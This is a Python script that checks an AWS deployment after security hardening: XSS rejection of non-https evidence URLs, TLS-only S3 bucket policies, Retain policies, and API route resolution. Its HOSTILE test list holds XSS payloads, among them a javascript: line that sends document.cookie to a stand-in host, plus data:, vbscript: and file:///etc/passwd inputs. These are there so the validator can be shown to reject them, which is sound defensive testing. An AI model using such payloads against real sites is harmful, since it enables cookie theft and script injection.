#!/usr/bin/env python3
"""Post-deploy verification for the security-hardening change set.

Covers the four changes that shipped together and had never been deployed:

  1. XSS write boundary  - contributions-scoring rejects non-https evidence URLs
  2. TLS-only S3 access  - all five buckets deny aws:SecureTransport=false
  3. Retain policies     - the five buckets survive a stack teardown
  4. Shoutouts routing   - the nine routes still resolve after api-edge.yaml
                           was regenerated from the contracts

Each one is checked against the DEPLOYED account, not the templates on disk.
Sections 1 and 4 invoke the real Lambdas directly with synthesised authorizer
claims, because the Cognito authorizer needs a human password. Section 2 proves
the deny is real by actually issuing a plaintext-HTTP request, rather than only
reading the policy back.

What this canNOT prove, and why: the TLS deny also applies to the AWS log
delivery services writing into AccessLogBucket and CloudFrontLogBucket. Those
writes are asynchronous and lag by hours, so a failure shows up as silence, not
an error. Section 2 records a marker and prints the follow-up command; run
--check-logs on the NEXT day to close that off.

Usage:
  python3 infra/tools/verify_security_hardening_deploy.py [--stage dev]
  python3 infra/tools/verify_security_hardening_deploy.py --check-logs
"""
from __future__ import annotations

import argparse
import contextlib
import json
import sys
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone

import boto3
from botocore.config import Config

OK, BAD, SKIP = "PASS", "FAIL", "SKIP"
failures: list[str] = []
skipped: list[str] = []

# Hostile evidence values. Each must be REJECTED at the write boundary.
# Chosen to cover the classes an allow-list must handle and a deny-list misses:
# alternate schemes, casing, whitespace padding, bare scheme, protocol-relative.
HOSTILE = [
    ("javascript: with a token exfil payload",
     "javascript:fetch('https://evil.example/'+document.cookie)"),
    ("javascript: mixed case", "JavaScript:alert(1)"),
    ("javascript: upper case", "JAVASCRIPT:alert(1)"),
    ("data: html", "data:text/html,<script>alert(1)</script>"),
    ("data: base64", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
    ("vbscript:", "vbscript:msgbox(1)"),
    ("blob:", "blob:https://evil.example/abc"),
    ("file:", "file:///etc/passwd"),
    ("plain http (allow-list is https only)", "http://evil.example/evidence"),
    ("protocol-relative", "//evil.example/evidence"),
    ("relative path", "/evidence.png"),
    ("leading whitespace", "   https://ok.example/e"),
    ("trailing whitespace", "https://ok.example/e   "),
    ("tab-padded javascript:", "\tjavascript:alert(1)"),
    ("bare scheme, no host", "https://"),
    ("empty string", ""),
]

SHOUTOUT_ROUTES = [
    ("POST", "/shoutouts"),
    ("GET", "/shoutouts/recent"),
    ("GET", "/shoutouts/all"),
    ("GET", "/shoutouts/my-sent"),
    ("GET", "/shoutouts/my-received"),
    ("GET", "/shoutouts/quota"),
    ("GET", "/shoutouts/member/{id}"),
    ("DELETE", "/shoutouts/{id}"),
    ("POST", "/shoutouts/{id}/react"),
]


def check(label: str, condition: bool, detail: str = "") -> bool:
    print(f"  [{OK if condition else BAD}] {label}" + (f"  ({detail})" if detail else ""))
    if not condition:
        failures.append(label)
    return condition


def skip(label: str, why: str) -> None:
    print(f"  [{SKIP}] {label}  ({why})")
    skipped.append(f"{label}: {why}")


def section(n: str, title: str) -> None:
    print(f"\n{'=' * 72}\n{n}. {title}\n{'=' * 72}")


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def stack_buckets(cfn, root: str) -> dict[str, str]:
    """Physical bucket names by logical id, across the nested tree."""
    out: dict[str, str] = {}
    nested = [root]
    for s in cfn.list_stack_resources(StackName=root)["StackResourceSummaries"]:
        if s["ResourceType"] == "AWS::CloudFormation::Stack":
            nested.append(s["PhysicalResourceId"])
    for st in nested:
        # Tolerate a nested stack that is mid-update or otherwise unreadable:
        # a missing bucket surfaces as an explicit FAIL below, which is more
        # useful than aborting the whole run here.
        with contextlib.suppress(Exception):
            for s in cfn.list_stack_resources(StackName=st)["StackResourceSummaries"]:
                if s["ResourceType"] == "AWS::S3::Bucket":
                    out[s["LogicalResourceId"]] = s["PhysicalResourceId"]
    return out


def lambda_caller(lam, fn: str):
    def call(method: str, path: str, claims: dict, body=None, qs=None, params=None):
        event = {
            "httpMethod": method,
            "path": path,
            "queryStringParameters": qs,
            "pathParameters": params,
            "body": json.dumps(body) if body is not None else None,
            "requestContext": {"authorizer": {"claims": claims}},
        }
        resp = lam.invoke(FunctionName=fn, Payload=json.dumps(event).encode())
        raw = resp["Payload"].read()
        try:
            out = json.loads(raw)
        except Exception:  # noqa: BLE001
            return 0, {"raw": raw[:400].decode("utf-8", "replace")}
        if "statusCode" not in out:  # an unhandled exception surfaced
            return 0, out
        parsed = {}
        if out.get("body"):
            try:
                parsed = json.loads(out["body"])
            except Exception:  # noqa: BLE001
                parsed = {"raw": out["body"][:400]}
        return out["statusCode"], parsed
    return call


def http_status(url: str, method: str = "GET", data: bytes | None = None) -> int | str:
    # Suppressed on purpose, and deliberately WITHOUT an https-only guard: the rule
    # guards against opening a URL whose scheme came from untrusted input. Here
    # every URL is built by this script, and varying the scheme between https and
    # http is precisely what is being tested (the TLS-only bucket policies must
    # reject http), so the "risk" the rule describes is the assertion. Adding a
    # scheme guard here would disable the check this script exists to perform.
    #
    # Needs BOTH comment forms: `# noqa: S310` for ruff, `# nosec B310` for bandit.
    # Only the ruff form was present, which is why bandit kept reporting these two
    # lines while ruff was clean.
    req = urllib.request.Request(url, method=method, data=data)  # noqa: S310  # nosec B310
    try:
        with urllib.request.urlopen(req, timeout=30) as r:  # noqa: S310  # nosec B310
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:  # noqa: BLE001
        return f"error:{type(e).__name__}"


# ---------------------------------------------------------------------------
# 1. XSS write boundary
# ---------------------------------------------------------------------------

def verify_xss(lam, stage: str) -> None:
    section("1", "XSS write boundary - non-https evidence URLs rejected")
    fn = f"contributions-scoring-{stage}"
    call = lambda_caller(lam, fn)

    group = f"g-verify-{uuid.uuid4().hex[:8]}"
    member = {"sub": f"verify-{uuid.uuid4().hex[:8]}", "role": "Member",
              "account_type": "cognito", "member_group_ids": group}

    # An active, evidence-required activity is a precondition for the code path
    # that validates evidence, so discover one from the live framework.
    st, fw = call("GET", "/contributions/framework", member)
    if st != 200:
        skip("discover an evidence-required activity", f"GET framework returned {st}")
        return
    acts = [a for a in (fw.get("activities") or fw.get("items") or [])
            if a.get("active") and a.get("evidenceRequired", True)]
    if not acts:
        skip("discover an evidence-required activity", "none active on the deployed framework")
        return
    activity = acts[0]
    aid = activity.get("activityId") or activity.get("id")
    print(f"  activity: {activity.get('name', aid)}  ({aid})")
    print(f"  claims  : role=Member group={group}\n")

    def submit(evidence: str):
        return call("POST", "/contributions/submissions", member, body={
            "groupId": group, "activity": aid,
            "evidence": evidence, "description": "post-deploy verification"})

    for label, value in HOSTILE:
        st, body = submit(value)
        shown = value if len(value) <= 46 else value[:43] + "..."
        rejected = st == 400
        names_field = "evidence" in json.dumps(body).lower()
        check(f"rejected: {label}", rejected and names_field,
              f"status={st} field-named={names_field} value={shown!r}")

    # The happy path must still work, otherwise the guard is simply breaking the
    # feature rather than hardening it.
    good = f"https://verify.example/evidence-{uuid.uuid4().hex[:8]}"
    st, body = submit(good)
    created = check("accepted: a well-formed https URL", st == 201, f"status={st}")
    sub_id = body.get("submissionId") or body.get("id") if created else None

    if created and sub_id:
        check("stored value is exactly what was submitted",
              body.get("evidence") == good, f"stored={body.get('evidence')!r}")
        # cleanup
        st, _ = call("DELETE", f"/contributions/submissions/{sub_id}", member,
                     params={"id": sub_id})
        check("cleanup: verification submission withdrawn", st in (200, 204),
              f"status={st} id={sub_id}")
    elif created:
        skip("cleanup", "response carried no submission id")

    # Nothing hostile may have been persisted. Listing the caller's own
    # submissions is the cheapest way to assert that from outside.
    st, mine = call("GET", "/contributions/submissions", member)
    if st == 200:
        items = mine.get("items", [])
        leaked = [i for i in items
                  if not str(i.get("evidence", "")).lower().startswith("https://")]
        check("no non-https evidence persisted for this caller",
              not leaked, f"{len(items)} submission(s), {len(leaked)} bad")
    else:
        skip("persistence re-read", f"listOwnSubmissions returned {st}")


# ---------------------------------------------------------------------------
# 2. TLS-only bucket policies
# ---------------------------------------------------------------------------

def verify_tls(s3, cfn, root: str, portal: str) -> None:
    section("2", "TLS-only S3 access - plaintext HTTP denied on all five buckets")
    buckets = stack_buckets(cfn, root)
    expected = ["AccessLogBucket", "FileShareBucket", "UserExportBucket",
                "SpaBucket", "CloudFrontLogBucket"]
    print("  discovered buckets:")
    for lid in expected:
        print(f"    {lid:22} {buckets.get(lid, '<NOT FOUND>')}")
    print()

    for lid in expected:
        name = buckets.get(lid)
        if not name:
            check(f"{lid}: present in the stack", False, "not found")
            continue
        try:
            pol = json.loads(s3.get_bucket_policy(Bucket=name)["Policy"])
        except Exception as e:  # noqa: BLE001
            check(f"{lid}: has a bucket policy", False, type(e).__name__)
            continue
        deny = [s for s in pol["Statement"]
                if s.get("Effect") == "Deny"
                and str(s.get("Condition", {}).get("Bool", {})
                        .get("aws:SecureTransport", "")).lower() == "false"]
        if not check(f"{lid}: has a non-TLS Deny statement", bool(deny)):
            continue
        st = deny[0]
        res = st.get("Resource")
        res = [res] if isinstance(res, str) else res
        bare = any(r.rstrip("/*").endswith(name) and not r.endswith("/*") for r in res)
        star = any(r.endswith("/*") for r in res)
        act = st.get("Action")
        check(f"{lid}: covers BOTH the bucket and object ARNs", bare and star,
              f"bare={bare} object={star}")
        check(f"{lid}: applies to s3:* and every principal",
              act == "s3:*" and st.get("Principal") in ("*", {"AWS": "*"}),
              f"action={act} principal={st.get('Principal')}")

    # Behavioural proof on the one bucket that takes real browser traffic.
    # A presigned signature covers host, path and query - not the scheme - so
    # the same URL can be replayed over plaintext to isolate the deny.
    fs = buckets.get("FileShareBucket")
    if fs:
        print()
        # SigV4 deliberately. The default presign here is SigV2, which signs
        # Content-Type -- and urllib adds `application/x-www-form-urlencoded` to
        # any request with a body, breaking the signature and returning 403
        # SignatureDoesNotMatch. That failure looks identical to the TLS deny, so
        # the plaintext check below would "pass" while proving nothing.
        signer = boto3.client("s3", region_name=s3.meta.region_name,
                              config=Config(signature_version="s3v4"))
        key = f"verification/tls-probe-{uuid.uuid4().hex[:8]}.txt"
        put = signer.generate_presigned_url("put_object",
                                            Params={"Bucket": fs, "Key": key},
                                            ExpiresIn=300)
        put_code = http_status(put, "PUT", b"tls-probe")
        check("presigned PUT over HTTPS succeeds", put_code == 200, f"status={put_code}")
        get = signer.generate_presigned_url("get_object",
                                            Params={"Bucket": fs, "Key": key}, ExpiresIn=300)
        get_code = http_status(get)
        check("presigned GET over HTTPS succeeds", get_code == 200, f"status={get_code}")
        # Same signature, same host, same path - only the scheme differs, which
        # isolates the deny as the single variable.
        plain = "http://" + get.split("://", 1)[1]
        code = http_status(plain)
        check("the SAME presigned GET over plaintext HTTP is denied (403)",
              code == 403 and get_code == 200,
              f"http={code} https={get_code}")
        try:
            s3.delete_object(Bucket=fs, Key=key)
            print(f"  [{OK}] cleanup: probe object deleted")
        except Exception as e:  # noqa: BLE001
            check("cleanup: probe object deleted", False, type(e).__name__)

    # The SPA is served through CloudFront, so the SpaBucket deny must not have
    # broken the origin fetch.
    if portal:
        print()
        code = http_status(f"https://{portal}/")
        check("SPA still served over CloudFront (HTTPS 200)", code == 200, f"status={code}")


# ---------------------------------------------------------------------------
# 3. Retain policies
# ---------------------------------------------------------------------------

def verify_retain(cfn, root: str) -> None:
    section("3", "Retain policies - buckets survive a stack teardown")
    nested = {}
    for s in cfn.list_stack_resources(StackName=root)["StackResourceSummaries"]:
        if s["ResourceType"] == "AWS::CloudFormation::Stack":
            nested[s["LogicalResourceId"]] = s["PhysicalResourceId"]

    want = {"Foundation": ["AccessLogBucket", "FileShareBucket", "UserExportBucket"],
            "ApiEdge": ["SpaBucket", "CloudFrontLogBucket"]}
    for stack_lid, buckets in want.items():
        phys = nested.get(stack_lid)
        if not phys:
            check(f"{stack_lid}: nested stack found", False)
            continue
        tpl = cfn.get_template(StackName=phys, TemplateStage="Processed")["TemplateBody"]
        if isinstance(tpl, str):
            import yaml
            tpl = yaml.safe_load(tpl)
        res = tpl.get("Resources", {})
        for b in buckets:
            r = res.get(b, {})
            dp, up = r.get("DeletionPolicy"), r.get("UpdateReplacePolicy")
            check(f"{stack_lid}/{b}: DeletionPolicy and UpdateReplacePolicy are Retain",
                  dp == "Retain" and up == "Retain",
                  f"Deletion={dp} UpdateReplace={up}")


# ---------------------------------------------------------------------------
# 4. Shoutouts routing
# ---------------------------------------------------------------------------

def verify_shoutouts(lam, stage: str) -> None:
    section("4", "Shoutouts routing - the nine routes still resolve")
    print("  api-edge.yaml was regenerated from the contracts, which is exactly the")
    print("  operation that used to delete these routes. A 501 NOT_IMPLEMENTED means")
    print("  the dispatch table did not match, i.e. the route is gone.\n")
    call = lambda_caller(lam, f"member-profiles-{stage}")
    who = {"sub": f"verify-{uuid.uuid4().hex[:8]}", "role": "Member",
           "account_type": "cognito"}

    for method, template in SHOUTOUT_ROUTES:
        path = template.replace("{id}", "verify-nonexistent-id")
        params = {"id": "verify-nonexistent-id"} if "{id}" in template else None
        body = {"recipientId": "verify-nobody", "message": "probe"} if method == "POST" else None
        st, resp = call(method, path, who, body=body, params=params)
        code = str(resp.get("code", ""))
        resolved = st != 501 and code != "NOT_IMPLEMENTED" and st != 0
        check(f"{method:6} {template:28} resolves", resolved,
              f"status={st}" + (f" code={code}" if code else ""))


# ---------------------------------------------------------------------------
# delayed log-delivery check
# ---------------------------------------------------------------------------

def policy_in_force_since(cfn, root: str):
    """When the TLS bucket policies actually took effect.

    The cutoff MUST be derived, not assumed. A fixed "last 24h" window counts
    objects delivered BEFORE the deny existed, so it reports success while
    delivery is broken -- the exact false positive this check exists to avoid.
    """
    nested = {r["LogicalResourceId"]: r["PhysicalResourceId"]
              for r in cfn.list_stack_resources(StackName=root)["StackResourceSummaries"]
              if r["ResourceType"] == "AWS::CloudFormation::Stack"}
    stamps = []
    for lid in ("Foundation", "ApiEdge"):
        phys = nested.get(lid)
        if not phys:
            continue
        found = None
        for e in cfn.describe_stack_events(StackName=phys)["StackEvents"]:
            if (e["LogicalResourceId"].endswith("BucketPolicy")
                    and e["ResourceStatus"] in ("UPDATE_COMPLETE", "CREATE_COMPLETE")):
                found = e["Timestamp"]
                break
        stamps.append(found or cfn.describe_stacks(StackName=phys)["Stacks"][0]["LastUpdatedTime"])
    return min(stamps) if stamps else datetime.now(timezone.utc) - timedelta(hours=24)


def check_logs(s3, cfn, root: str) -> None:
    section("2b", "Log delivery still arriving under the TLS deny")
    buckets = stack_buckets(cfn, root)
    cutoff = policy_in_force_since(cfn, root)
    hours = (datetime.now(timezone.utc) - cutoff).total_seconds() / 3600
    print(f"  TLS deny in force since {cutoff.isoformat()}  ({hours:.1f}h of coverage)")
    print("  Only objects delivered AFTER that instant prove anything.\n")
    if hours < 1:
        skip("log delivery", f"only {hours * 60:.0f} min since the deny; too soon to conclude")
        return
    targets = [("AccessLogBucket", ["file-share-access-logs/", "user-export-access-logs/"]),
               ("CloudFrontLogBucket", ["cloudfront/"])]
    for lid, prefixes in targets:
        name = buckets.get(lid)
        if not name:
            check(f"{lid}: found", False)
            continue
        for pfx in prefixes:
            objs, tok = [], {}
            while True:
                r = s3.list_objects_v2(Bucket=name, Prefix=pfx, **tok)
                objs += r.get("Contents", [])
                if not r.get("IsTruncated"):
                    break
                tok = {"ContinuationToken": r["NextContinuationToken"]}
            after = [o for o in objs if o["LastModified"] > cutoff]
            newest = max((o["LastModified"] for o in objs), default=None)
            check(f"{lid}/{pfx}: delivery continued after the deny took effect",
                  bool(after),
                  f"{len(after)} of {len(objs)} objects post-deny, newest="
                  + (newest.isoformat() if newest else "none")
                  + ("" if objs else " - EMPTY, delivery may be broken"))


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--stage", default="dev")
    ap.add_argument("--region", default="us-east-1")
    ap.add_argument("--stack", default=None)
    ap.add_argument("--check-logs", action="store_true",
                    help="only run the delayed log-delivery check")
    args = ap.parse_args()

    root = args.stack or f"community-portal-{args.stage}"
    lam = boto3.client("lambda", region_name=args.region)
    s3 = boto3.client("s3", region_name=args.region)
    cfn = boto3.client("cloudformation", region_name=args.region)

    outs = {o["OutputKey"]: o["OutputValue"] for o in
            (cfn.describe_stacks(StackName=root)["Stacks"][0].get("Outputs") or [])}
    portal = outs.get("PortalUrl", "")

    print(f"stack={root}  region={args.region}  stage={args.stage}")
    print(f"portal={portal}  api={outs.get('ApiEndpoint', '')}")

    if args.check_logs:
        check_logs(s3, cfn, root)
    else:
        verify_xss(lam, args.stage)
        verify_tls(s3, cfn, root, portal)
        verify_retain(cfn, root)
        verify_shoutouts(lam, args.stage)
        print("\n" + "-" * 72)
        print("Log delivery lags and fails SILENTLY, so re-check it independently:")
        print("  (derives its own cutoff from when the policy landed)")
        print("  python3 infra/tools/verify_security_hardening_deploy.py --check-logs")

    print("\n" + "=" * 72)
    if skipped:
        print(f"{len(skipped)} check(s) skipped:")
        for s in skipped:
            print(f"  - {s}")
    if failures:
        print(f"{len(failures)} CHECK(S) FAILED:")
        for f in failures:
            print(f"  - {f}")
        return 1
    print("all checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
